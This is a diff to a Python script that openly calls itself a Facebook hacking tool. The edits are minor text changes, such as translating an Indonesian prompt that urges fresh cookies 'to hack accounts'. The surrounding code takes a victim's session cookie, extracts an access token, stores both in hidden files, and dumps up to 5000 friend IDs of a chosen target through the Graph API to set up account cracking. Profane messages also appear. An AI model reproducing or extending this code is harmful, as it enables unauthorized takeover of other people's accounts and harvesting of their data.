@@ -181,8 +181,8 @@ def back():
 def banner():
 	cetak(panel(f"""
 TOOLS : Emad alkhashn
-HACK   : FACEBOOK 
-TIME    : 1/1/2023
+HACK  : FACEBOOK 
+TIME  : 1/1/2023
              """,width=90,title=f"TOOLS EMAD",style=f"bold white"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
@@ -209,7 +209,7 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
+		cetak(nel('It is recommended to use cookies that are still fresh to hack accounts',width=90,style=f"bold white"))
 		your_cookies = input(' ╰─  Masukan Cookie : ')
 		with requests.Session() as r:
 			try:
@@ -257,7 +257,7 @@ def login_lagi334():
 							print(f"\n ╰─  Token : {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\n ╰─  Login Berhasil | python BrayennnFB.py");exit()
+							print("\n ╰─  Login | python run.py");exit()
 			except Exception as e:
 				print(" ╰─  Cookies Mokad Kontol")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
@@ -1104,7 +1104,7 @@ def brayen_dump():
 		kukis = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
+	#cetak(panel
 	pil = input(f' ╰─  Masukan ID Target : ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
